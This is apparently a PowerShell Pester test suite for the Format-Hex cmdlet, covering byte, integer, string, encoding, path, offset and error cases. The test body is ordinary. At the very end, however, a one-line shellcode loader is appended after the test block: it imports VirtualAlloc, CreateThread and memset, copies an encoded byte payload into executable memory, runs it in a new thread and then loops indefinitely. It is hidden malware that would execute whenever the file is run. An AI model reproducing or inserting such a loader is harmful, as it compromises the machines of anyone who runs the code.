






Describe "FormatHex" -tags "CI" {

    BeforeAll {

        $newline = [Environment]::Newline

        Setup -d FormatHexDataDir
        $inputFile1 = New-Item -Path "$TestDrive/SourceFile-1.txt"
        $inputText1 = 'Hello World'
        Set-Content -LiteralPath $inputFile1.FullName -Value $inputText1 -NoNewline

        $inputFile2 = New-Item -Path "$TestDrive/SourceFile-2.txt"
        $inputText2 = 'More text'
        Set-Content -LiteralPath $inputFile2.FullName -Value $inputText2 -NoNewline

        $inputFile3 = New-Item -Path "$TestDrive/SourceFile literal [3].txt"
        $inputText3 = 'Literal path'
        Set-Content -LiteralPath $inputFile3.FullName -Value $inputText3 -NoNewline

        $inputFile4 = New-Item -Path "$TestDrive/SourceFile-4.txt"
        $inputText4 = 'Now is the winter of our discontent'
        Set-Content -LiteralPath $inputFile4.FullName -Value $inputText4 -NoNewline

        $certificateProvider = Get-ChildItem Cert:\CurrentUser\My\ -ErrorAction SilentlyContinue
        $thumbprint = $null
        $certProviderAvailable = $false

        if ($certificateProvider.Count -gt 0) {
            $thumbprint = $certificateProvider[0].Thumbprint
            $certProviderAvailable = $true
        }

        $skipTest = ([System.Management.Automation.Platform]::IsLinux -or [System.Management.Automation.Platform]::IsMacOS -or (-not $certProviderAvailable))
    }

    Context "InputObject Paramater" {
        BeforeAll {
            enum TestEnum {
                TestOne = 1; TestTwo = 2; TestThree = 3; TestFour = 4
            }
            Add-Type -TypeDefinition @'
public enum TestSByteEnum : sbyte {
    One   = -1,
    Two   = -2,
    Three = -3,
    Four  = -4
}
'@
        }

        $testCases = @(
            @{
                Name           = "Can process byte type 'fhx -InputObject [byte]5'"
                InputObject    = [byte]5
                Count          = 1
                ExpectedResult = "00000000   05"
            }
            @{
                Name           = "Can process byte[] type 'fhx -InputObject [byte[]](1,2,3,4,5)'"
                InputObject    = [byte[]](1, 2, 3, 4, 5)
                Count          = 1
                ExpectedResult = "00000000   01 02 03 04 05                                   ....."
            }
            @{
                Name           = "Can process int type 'fhx -InputObject 7'"
                InputObject    = 7
                Count          = 1
                ExpectedResult = "00000000   07 00 00 00                                      ...."
            }
            @{
                Name           = "Can process int[] type 'fhx -InputObject [int[]](5,6,7,8)'"
                InputObject    = [int[]](5, 6, 7, 8)
                Count          = 1
                ExpectedResult = "00000000   05 00 00 00 06 00 00 00 07 00 00 00 08 00 00 00  ................"
            }
            @{
                Name           = "Can process int32 type 'fhx -InputObject [int32]2032'"
                InputObject    = [int32]2032
                Count          = 1
                ExpectedResult = "00000000   F0 07 00 00                                      ð..."
            }
            @{
                Name           = "Can process int32[] type 'fhx -InputObject [int32[]](2032, 2033, 2034)'"
                InputObject    = [int32[]](2032, 2033, 2034)
                Count          = 1
                ExpectedResult = "0000000000000000   F0 07 00 00 F1 07 00 00 F2 07 00 00              ð...ñ...ò..."
            }
            @{
                Name           = "Can process Int64 type 'fhx -InputObject [Int64]9223372036854775807'"
                InputObject    = [Int64]9223372036854775807
                Count          = 1
                ExpectedResult = "0000000000000000   FF FF FF FF FF FF FF 7F                          ÿÿÿÿÿÿÿ�"
            }
            @{
                Name           = "Can process Int64[] type 'fhx -InputObject [Int64[]](9223372036852,9223372036853)'"
                InputObject    = [Int64[]](9223372036852, 9223372036853)
                Count          = 1
                ExpectedResult = "0000000000000000   F4 5A D0 7B 63 08 00 00 F5 5A D0 7B 63 08 00 00  ôZÐ{c...õZÐ{c..."
            }
            @{
                Name           = "Can process string type 'fhx -InputObject hello world'"
                InputObject    = "hello world"
                Count          = 1
                ExpectedResult = "0000000000000000   68 65 6C 6C 6F 20 77 6F 72 6C 64                 hello world"
            }
            @{
                Name           = "Can process PS-native enum array '[TestEnum[]]('TestOne', 'TestTwo', 'TestThree', 'TestFour') | fhx'"
                InputObject    = [TestEnum[]]('TestOne', 'TestTwo', 'TestThree', 'TestFour')
                Count          = 1
                ExpectedResult = "0000000000000000   01 00 00 00 02 00 00 00 03 00 00 00 04 00 00 00  ................"
            }
            @{
                Name           = "Can process C
                InputObject    = [TestSByteEnum[]]('One', 'Two', 'Three', 'Four')
                Count          = 1
                ExpectedResult = "0000000000000000   FF FE FD FC                                      .þýü"
            }
        )

        It "<Name>" -TestCase $testCases {

            param ($Name, $InputObject, $Count, $ExpectedResult)

            $result = Format-Hex -InputObject $InputObject

            $result.count | Should -Be $Count
            $result | Should -BeOfType 'Microsoft.PowerShell.Commands.ByteCollection'
            $result.ToString() | Should -MatchExactly $ExpectedResult
        }
    }

    Context "InputObject From Pipeline" {
        BeforeAll {
            enum TestEnum {
                TestOne = 1; TestTwo = 2; TestThree = 3; TestFour = 4
            }
            Add-Type -TypeDefinition @'
public enum TestSByteEnum : sbyte {
    One   = -1,
    Two   = -2,
    Three = -3,
    Four  = -4
}
'@
        }

        $testCases = @(
            @{
                Name           = "Can process byte type '[byte]5 | fhx'"
                InputObject    = [byte]5
                Count          = 1
                ExpectedResult = "0000000000000000   05"
            }
            @{
                Name           = "Can process byte[] type '[byte[]](1,2) | fhx'"
                InputObject    = [byte[]](1, 2)
                Count          = 1
                ExpectedResult = "0000000000000000   01 02                                            ��"
            }
            @{
                Name           = "Can process int type '7 | fhx'"
                InputObject    = 7
                Count          = 1
                ExpectedResult = "0000000000000000   07 00 00 00                                      �   "
            }
            @{
                Name           = "Can process int[] type '[int[]](5,6) | fhx'"
                InputObject    = [int[]](5, 6)
                Count          = 1
                ExpectedResult = "0000000000000000   05 00 00 00 06 00 00 00                          �   �   "
            }
            @{
                Name           = "Can process int32 type '[int32]2032 | fhx'"
                InputObject    = [int32]2032
                Count          = 1
                ExpectedResult = "0000000000000000   F0 07 00 00                                      ð�  "
            }
            @{
                Name           = "Can process int32[] type '[int32[]](2032, 2033) | fhx'"
                InputObject    = [int32[]](2032, 2033)
                Count          = 1
                ExpectedResult = "0000000000000000   F0 07 00 00 F1 07 00 00                          ð�  ñ�  "
            }
            @{
                Name           = "Can process Int64 type '[Int64]9223372036854775807 | fhx'"
                InputObject    = [Int64]9223372036854775807
                Count          = 1
                ExpectedResult = "0000000000000000   FF FF FF FF FF FF FF 7F                          ÿÿÿÿÿÿÿ�"
            }
            @{
                Name           = "Can process Int64[] type '[Int64[]](9223372036852,9223372036853) | fhx'"
                InputObject    = [Int64[]](9223372036852, 9223372036853)
                Count          = 1
                ExpectedResult = "0000000000000000   F4 5A D0 7B 63 08 00 00 F5 5A D0 7B 63 08 00 00  ôZÐ{c�  õZÐ{c�  "
            }
            @{
                Name           = "Can process string type 'hello world | fhx'"
                InputObject    = "hello world"
                Count          = 1
                ExpectedResult = "0000000000000000   68 65 6C 6C 6F 20 77 6F 72 6C 64                 hello world"
            }
            @{
                Name                 = "Can process string type amidst other types { 1, 2, 3, 'hello world' | fhx }"
                InputObject          = 1, 2, 3, "hello world"
                Count                = 2
                ExpectedResult       = "0000000000000000   01 00 00 00 02 00 00 00 03 00 00 00              �   �   �   "
                ExpectedSecondResult = "0000000000000000   68 65 6C 6C 6F 20 77 6F 72 6C 64                 hello world"
            }
            @{
                Name                 = "Can process jagged array type '[sbyte[]](-15, 18, 21, -5), [byte[]](1, 2, 3, 4, 5, 6) | fhx'"
                InputObject          = [sbyte[]](-15, 18, 21, -5), [byte[]](1, 2, 3, 4, 5, 6)
                Count                = 2
                ExpectedResult       = "0000000000000000   F1 12 15 FB                                      ñ��û"
                ExpectedSecondResult = "0000000000000000   01 02 03 04 05 06                                ������"
            }
            @{
                Name           = "Can process PS-native enum array '[TestEnum[]]('TestOne', 'TestTwo', 'TestThree', 'TestFour') | fhx'"
                InputObject    = [TestEnum[]]('TestOne', 'TestTwo', 'TestThree', 'TestFour')
                Count          = 1
                ExpectedResult = "0000000000000000   01 00 00 00 02 00 00 00 03 00 00 00 04 00 00 00  �   �   �   �   "
            }
            @{
                Name           = "Can process C
                InputObject    = [TestSByteEnum[]]('One', 'Two', 'Three', 'Four')
                Count          = 1
                ExpectedResult = "0000000000000000   FF FE FD FC                                      ÿþýü"
            }
        )

        It "<Name>" -TestCases $testCases {

            param ($Name, $InputObject, $Count, $ExpectedResult, $ExpectedSecondResult)

            $result = $InputObject | Format-Hex

            $result.Count | Should -Be $Count
            $result | Should -BeOfType 'Microsoft.PowerShell.Commands.ByteCollection'
            $result[0].ToString() | Should -MatchExactly $ExpectedResult

            if ($result.count -gt 1) {
                $result[1].ToString() | Should -MatchExactly $ExpectedSecondResult
            }
        }

        $heterogenousInputCases = @(
            @{
                InputScript     = { [sbyte[]](-15, 18, 21, -5), "hello", [byte[]](1..6), 1, 2, 3, 4 }
                Count           = 4
                ExpectedResults = @(
                    "0000000000000000   F1 12 15 FB                                      ñ��û"
                    "0000000000000000   68 65 6C 6C 6F                                   hello"
                    "0000000000000000   01 02 03 04 05 06                                ������"
                    "0000000000000000   01 00 00 00 02 00 00 00 03 00 00 00 04 00 00 00  �   �   �   �   "
                )
                ExpectedLabels  = @(
                    "System.SByte[]"
                    "System.String"
                    "System.Byte"
                    "System.Int32"
                ).ForEach{ [regex]::Escape($_) } -join '|'
            }
            @{
                InputScript     = { $inputFile1, "Mountains are merely mountains", 1, 4, 5, 3, [ushort[]](1..10) }
                Count           = 6
                ExpectedResults = @(
                    "0000000000000000   48 65 6C 6C 6F 20 57 6F 72 6C 64                 Hello World"
                    "0000000000000000   4D 6F 75 6E 74 61 69 6E 73 20 61 72 65 20 6D 65  Mountains are me"
                    "0000000000000010   72 65 6C 79 20 6D 6F 75 6E 74 61 69 6E 73        rely mountains"
                    "0000000000000000   01 00 00 00 04 00 00 00 05 00 00 00 03 00 00 00  �   �   �   �   "
                    "0000000000000000   01 00 02 00 03 00 04 00 05 00 06 00 07 00 08 00  � � � � � � � � "
                    "0000000000000010   09 00 0A 00                                      � � "
                )
                ExpectedLabels  = @(
                    $inputFile1.FullName
                    "System.String"
                    "System.Int32"
                    "System.UInt16[]"
                ).ForEach{ [regex]::Escape($_) } -join '|'
            }
        )

        It 'can process jagged input: <InputScript>' -TestCases $heterogenousInputCases {
            param($InputScript, $Count, $ExpectedResults, $ExpectedLabels)

            $Results = & $InputScript | Format-Hex
            $Results | Should -HaveCount $Count
            $ExpectedResults | Should -HaveCount $Count

            for ($Number = 0; $Number -lt $Results.Count; $Number++) {
                $Results[$Number] | Should -MatchExactly $ExpectedResults[$Number]
                $Results[$Number].Label | Should -MatchExactly $ExpectedLabels
            }
        }
    }

    Context "Path and LiteralPath Parameters" {

        $testDirectory = $inputFile1.DirectoryName

        $testCases = @(
            @{
                Name           = "Can process file content from given file path 'fhx -Path `$inputFile1'"
                PathCase       = $true
                Path           = $inputFile1
                Count          = 1
                ExpectedResult = $inputText1
            }
            @{
                Name                 = "Can process file content from all files in array of file paths 'fhx -Path `$inputFile1, `$inputFile2'"
                PathCase             = $true
                Path                 = @($inputFile1, $inputFile2)
                Count                = 2
                ExpectedResult       = $inputText1
                ExpectedSecondResult = $inputText2
            }
            @{
                Name                 = "Can process file content from all files when resolved to multiple paths 'fhx -Path '`$testDirectory\SourceFile-*''"
                PathCase             = $true
                Path                 = "$testDirectory\SourceFile-*"
                Count                = 2
                ExpectedResult       = $inputText1
                ExpectedSecondResult = $inputText2
            }
            @{
                Name           = "Can process file content from given file path 'fhx -LiteralPath `$inputFile3'"
                Path           = $inputFile3
                Count          = 1
                ExpectedResult = $inputText3
            }
            @{
                Name                 = "Can process file content from all files in array of file paths 'fhx -LiteralPath `$inputFile1, `$inputFile3'"
                Path                 = @($inputFile1, $inputFile3)
                Count                = 2
                ExpectedResult       = $inputText1
                ExpectedSecondResult = $inputText3
            }
        )

        It "<Name>" -TestCase $testCases {

            param ($Name, $PathCase, $Path, $ExpectedResult, $ExpectedSecondResult)

            if ($PathCase) {
                $result = Format-Hex -Path $Path
            }
            else {
                
                $result = Format-Hex -LiteralPath $Path
            }

            $result | Should -BeOfType 'Microsoft.PowerShell.Commands.ByteCollection'
            $result[0].ToString() | Should -MatchExactly $ExpectedResult

            if ($result.count -gt 1) {
                $result[1].ToString() | Should -MatchExactly $ExpectedSecondResult
            }
        }

        It 'properly accepts -LiteralPath input from a FileInfo object' {
            $FilePath = 'TestDrive:\FHX-LitPathTest.txt'
            "Hello World!" | Set-Content -Path $FilePath
            $FileObject = Get-Item -Path $FilePath

            $result = $FileObject | Format-Hex
            if ($IsWindows) {
                $Result.Bytes[-1] | Should -Be 0x0A
                $Result.Bytes[-2] | Should -Be 0x0D
                $Result.Bytes.Length | Should -Be 14
            }
            else {
                $Result.Bytes[-1] | Should -Be 0x0A
                $Result.Bytes.Length | Should -Be 13
            }
        }
    }

    Context "Encoding Parameter" {
        $testCases = @(
            @{
                Name           = "Can process ASCII encoding 'fhx -InputObject 'hello' -Encoding ASCII'"
                Encoding       = "ASCII"
                Count          = 1
                ExpectedResult = "0000000000000000   68 65 6C 6C 6F                                   hello"
            }
            @{
                Name           = "Can process BigEndianUnicode encoding 'fhx -InputObject 'hello' -Encoding BigEndianUnicode'"
                Encoding       = "BigEndianUnicode"
                Count          = 1
                ExpectedResult = "0000000000000000   00 68 00 65 00 6C 00 6C 00 6F                     h e l l o"
            }
            @{
                Name           = "Can process Unicode encoding 'fhx -InputObject 'hello' -Encoding Unicode'"
                Encoding       = "Unicode"
                Count          = 1
                ExpectedResult = "0000000000000000   68 00 65 00 6C 00 6C 00 6F 00                    h e l l o "
            }
            @{
                Name           = "Can process UTF7 encoding 'fhx -InputObject 'hello' -Encoding UTF7'"
                Encoding       = "UTF7"
                Count          = 1
                ExpectedResult = "0000000000000000   68 65 6C 6C 6F                                   hello"
            }
            @{
                Name           = "Can process UTF8 encoding 'fhx -InputObject 'hello' -Encoding UTF8'"
                Encoding       = "UTF8"
                Count          = 1
                ExpectedResult = "0000000000000000   68 65 6C 6C 6F                                   hello"
            }
            @{
                Name                 = "Can process UTF32 encoding 'fhx -InputObject 'hello' -Encoding UTF32'"
                Encoding             = "UTF32"
                Count                = 2
                ExpectedResult       = "0000000000000000   68 00 00 00 65 00 00 00 6C 00 00 00 6C 00 00 00  h   e   l   l   "
                ExpectedSecondResult = "0000000000000010   6F 00 00 00                                      o   "
            }
        )

        It "<Name>" -TestCase $testCases {

            param ($Name, $Encoding, $Count, $ExpectedResult)

            $result = Format-Hex -InputObject 'hello' -Encoding $Encoding

            $result.count | Should -Be $Count
            $result | Should -BeOfType 'Microsoft.PowerShell.Commands.ByteCollection'
            $result[0].ToString() | Should -MatchExactly $ExpectedResult
        }
    }

    Context "Validate Error Scenarios" {

        $testDirectory = $inputFile1.DirectoryName

        $testCases = @(
            @{
                Name                          = "Does not support non-FileSystem Provider paths 'fhx -Path 'Cert:\CurrentUser\My\`$thumbprint' -ErrorAction Stop'"
                PathParameterErrorCase        = $true
                Path                          = "Cert:\CurrentUser\My\$thumbprint"
                ExpectedFullyQualifiedErrorId = "FormatHexOnlySupportsFileSystemPaths,Microsoft.PowerShell.Commands.FormatHex"
            }
            @{
                Name                          = "Type Not Supported 'fhx -InputObject @{'hash' = 'table'} -ErrorAction Stop'"
                InputObjectErrorCase          = $true
                Path                          = $inputFile1
                InputObject                   = @{ "hash" = "table" }
                ExpectedFullyQualifiedErrorId = "FormatHexTypeNotSupported,Microsoft.PowerShell.Commands.FormatHex"
            }
        )

        It "<Name>" -Skip:$skipTest -TestCase $testCases {

            param ($Name, $PathParameterErrorCase, $Path, $InputObject, $InputObjectErrorCase, $ExpectedFullyQualifiedErrorId)

            {
                if ($PathParameterErrorCase) {
                    $result = Format-Hex -Path $Path -ErrorAction Stop
                }
                if ($InputObjectErrorCase) {
                    $result = Format-Hex -InputObject $InputObject -ErrorAction Stop
                }
            } | Should -Throw -ErrorId $ExpectedFullyQualifiedErrorId
        }
    }

    Context "Continues to Process Valid Paths" {

        $testCases = @(
            @{
                Name                          = "If given invalid path in array, continues to process valid paths 'fhx -Path `$invalidPath, `$inputFile1  -ErrorVariable e -ErrorAction SilentlyContinue'"
                PathCase                      = $true
                InvalidPath                   = "$($inputFile1.DirectoryName)\fakefile8888845345345348709.txt"
                ExpectedFullyQualifiedErrorId = "FileNotFound,Microsoft.PowerShell.Commands.FormatHex"
            }
            @{
                Name                          = "If given a non FileSystem path in array, continues to process valid paths 'fhx -Path `$invalidPath, `$inputFile1  -ErrorVariable e -ErrorAction SilentlyContinue'"
                PathCase                      = $true
                InvalidPath                   = "Cert:\CurrentUser\My\$thumbprint"
                ExpectedFullyQualifiedErrorId = "FormatHexOnlySupportsFileSystemPaths,Microsoft.PowerShell.Commands.FormatHex"
            }
            @{
                Name                          = "If given a non FileSystem path in array (with LiteralPath), continues to process valid paths 'fhx -Path `$invalidPath, `$inputFile1  -ErrorVariable e -ErrorAction SilentlyContinue'"
                InvalidPath                   = "Cert:\CurrentUser\My\$thumbprint"
                ExpectedFullyQualifiedErrorId = "FormatHexOnlySupportsFileSystemPaths,Microsoft.PowerShell.Commands.FormatHex"
            }
        )

        It "<Name>" -Skip:$skipTest -TestCase $testCases {

            param ($Name, $PathCase, $InvalidPath, $ExpectedFullyQualifiedErrorId)

            $output = $null
            $errorThrown = $null

            if ($PathCase) {
                $output = Format-Hex -Path $InvalidPath, $inputFile1 -ErrorVariable errorThrown -ErrorAction SilentlyContinue
            }
            else {
                
                $output = Format-Hex -LiteralPath $InvalidPath, $inputFile1 -ErrorVariable errorThrown -ErrorAction SilentlyContinue
            }

            $errorThrown.FullyQualifiedErrorId | Should -MatchExactly $ExpectedFullyQualifiedErrorId

            $output.Length | Should -Be 1
            $output[0].ToString() | Should -MatchExactly $inputText1
        }
    }

    Context "Cmdlet Functionality" {

        It "Path is default Parameter Set 'fhx `$inputFile1'" {

            $result = Format-Hex $inputFile1

            $result | Should -Not -BeNullOrEmpty
            , $result | Should -BeOfType 'Microsoft.PowerShell.Commands.ByteCollection'
            $actualResult = $result.ToString()
            $actualResult | Should -MatchExactly $inputText1
        }

        It "Validate file input from Pipeline 'Get-ChildItem `$inputFile1 | Format-Hex'" {

            $result = Get-ChildItem $inputFile1 | Format-Hex

            $result | Should -Not -BeNullOrEmpty
            , $result | Should -BeOfType 'Microsoft.PowerShell.Commands.ByteCollection'
            $actualResult = $result.ToString()
            $actualResult | Should -MatchExactly $inputText1
        }

        It "Validate that streamed text does not have buffer underrun problems ''a' * 30 | Format-Hex'" {

            $result = "a" * 30 | Format-Hex

            $result | Should -Not -BeNullOrEmpty
            $result | Should -BeOfType 'Microsoft.PowerShell.Commands.ByteCollection'
            $result[0].ToString() | Should -MatchExactly "0000000000000000   61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa"
            $result[1].ToString() | Should -MatchExactly "0000000000000010   61 61 61 61 61 61 61 61 61 61 61 61 61 61        aaaaaaaaaaaaaa  "
        }

        It "Validate that files do not have buffer underrun problems 'Format-Hex -Path `$InputFile4'" {

            $result = Format-Hex -Path $InputFile4

            $result | Should -Not -BeNullOrEmpty
            $result.Count | Should -Be 3
            $result[0].ToString() | Should -MatchExactly "0000000000000000   4E 6F 77 20 69 73 20 74 68 65 20 77 69 6E 74 65  Now is the winte"
            $result[1].ToString() | Should -MatchExactly "0000000000000010   72 20 6F 66 20 6F 75 72 20 64 69 73 63 6F 6E 74  r of our discont"
            $result[2].ToString() | Should -MatchExactly "0000000000000020   65 6E 74                                         ent             "
        }
    }

    Context "Count and Offset parameters" {
        It "Count = length" {

            $result = Format-Hex -Path $InputFile4 -Count $inputText4.Length

            $result | Should -Not -BeNullOrEmpty
            $result.Count | Should -Be 3
            $result[0].ToString() | Should -MatchExactly "0000000000000000   4E 6F 77 20 69 73 20 74 68 65 20 77 69 6E 74 65  Now is the winte"
            $result[1].ToString() | Should -MatchExactly "0000000000000010   72 20 6F 66 20 6F 75 72 20 64 69 73 63 6F 6E 74  r of our discont"
            $result[2].ToString() | Should -MatchExactly "0000000000000020   65 6E 74                                         ent             "
        }

        It "Count = 1" {
            $result = Format-Hex -Path $inputFile4 -Count 1
            $result.ToString() | Should -MatchExactly    "0000000000000000   4E                                               N               "
        }

        It "Offset = length" {
            $result = Format-Hex -Path $InputFile4 -Offset $inputText4.Length
            $result | Should -BeNullOrEmpty

            $result = Format-Hex -InputObject $inputText4 -Offset $inputText4.Length
            $result | Should -BeNullOrEmpty
        }

        It "Offset = 1" {

            $result = Format-Hex -Path $InputFile4 -Offset 1

            $result | Should -Not -BeNullOrEmpty
            $result.Count | Should -Be 3
            $result[0].ToString() | Should -MatchExactly "0000000000000001   6F 77 20 69 73 20 74 68 65 20 77 69 6E 74 65 72  ow is the winter"
            $result[1].ToString() | Should -MatchExactly "0000000000000011   20 6F 66 20 6F 75 72 20 64 69 73 63 6F 6E 74 65   of our disconte"
            $result[2].ToString() | Should -MatchExactly "0000000000000021   6E 74                                            nt              "
        }

        It "Count = 1 and Offset = 1" {
            $result = Format-Hex -Path $inputFile4 -Count 1 -Offset 1
            $result.ToString() | Should -MatchExactly    "0000000000000001   6F                                               o               "
        }

        It "Count should be > 0" {
            { Format-Hex -Path $inputFile4 -Count 0 } | Should -Throw -ErrorId "ParameterArgumentValidationError,Microsoft.PowerShell.Commands.FormatHex"
        }

        It "Offset should be >= 0" {
            { Format-Hex -Path $inputFile4 -Offset -1 } | Should -Throw -ErrorId "ParameterArgumentValidationError,Microsoft.PowerShell.Commands.FormatHex"
        }

        It "Offset = 0" {

            $result = Format-Hex -Path $InputFile4 -Offset 0

            $result | Should -Not -BeNullOrEmpty
            $result.Count | Should -Be 3
            $result[0].ToString() | Should -MatchExactly "0000000000000000   4E 6F 77 20 69 73 20 74 68 65 20 77 69 6E 74 65  Now is the winte"
            $result[1].ToString() | Should -MatchExactly "0000000000000010   72 20 6F 66 20 6F 75 72 20 64 69 73 63 6F 6E 74  r of our discont"
            $result[2].ToString() | Should -MatchExactly "0000000000000020   65 6E 74                                         ent             "
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xfa,0x15,0x5c,0xea,0xda,0xd7,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x31,0x45,0x13,0x03,0x45,0x13,0x83,0xed,0x06,0xf7,0xa9,0x16,0x1e,0x7a,0x51,0xe7,0xde,0x1b,0xdb,0x02,0xef,0x1b,0xbf,0x47,0x5f,0xac,0xcb,0x0a,0x53,0x47,0x99,0xbe,0xe0,0x25,0x36,0xb0,0x41,0x83,0x60,0xff,0x52,0xb8,0x51,0x9e,0xd0,0xc3,0x85,0x40,0xe9,0x0b,0xd8,0x81,0x2e,0x71,0x11,0xd3,0xe7,0xfd,0x84,0xc4,0x8c,0x48,0x15,0x6e,0xde,0x5d,0x1d,0x93,0x96,0x5c,0x0c,0x02,0xad,0x06,0x8e,0xa4,0x62,0x33,0x87,0xbe,0x67,0x7e,0x51,0x34,0x53,0xf4,0x60,0x9c,0xaa,0xf5,0xcf,0xe1,0x03,0x04,0x11,0x25,0xa3,0xf7,0x64,0x5f,0xd0,0x8a,0x7e,0xa4,0xab,0x50,0x0a,0x3f,0x0b,0x12,0xac,0x9b,0xaa,0xf7,0x2b,0x6f,0xa0,0xbc,0x38,0x37,0xa4,0x43,0xec,0x43,0xd0,0xc8,0x13,0x84,0x51,0x8a,0x37,0x00,0x3a,0x48,0x59,0x11,0xe6,0x3f,0x66,0x41,0x49,0x9f,0xc2,0x09,0x67,0xf4,0x7e,0x50,0xef,0x39,0xb3,0x6b,0xef,0x55,0xc4,0x18,0xdd,0xfa,0x7e,0xb7,0x6d,0x72,0x59,0x40,0x92,0xa9,0x1d,0xde,0x6d,0x52,0x5e,0xf6,0xa9,0x06,0x0e,0x60,0x18,0x27,0xc5,0x70,0xa5,0xf2,0x70,0x74,0x31,0x69,0x74,0x2f,0xce,0xf9,0x77,0xd0,0xd5,0x25,0xfe,0x36,0x85,0x85,0x51,0xe7,0x65,0x76,0x12,0x57,0x0d,0x9c,0x9d,0x88,0x2d,0x9f,0x77,0xa1,0xc7,0x70,0x2e,0x99,0x7f,0xe8,0x6b,0x51,0x1e,0xf5,0xa1,0x1f,0x20,0x7d,0x46,0xdf,0xee,0x76,0x23,0xf3,0x86,0x76,0x7e,0xa9,0x00,0x88,0x54,0xc4,0xac,0x1c,0x53,0x4f,0xfb,0x88,0x59,0xb6,0xcb,0x16,0xa1,0x9d,0x40,0x9e,0x37,0x5e,0x3e,0xdf,0xd7,0x5e,0xbe,0x89,0xbd,0x5e,0xd6,0x6d,0xe6,0x0c,0xc3,0x71,0x33,0x21,0x58,0xe4,0xbc,0x10,0x0d,0xaf,0xd4,0x9e,0x68,0x87,0x7a,0x60,0x5f,0x19,0x46,0xb7,0x99,0x6f,0xa6,0x0b;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

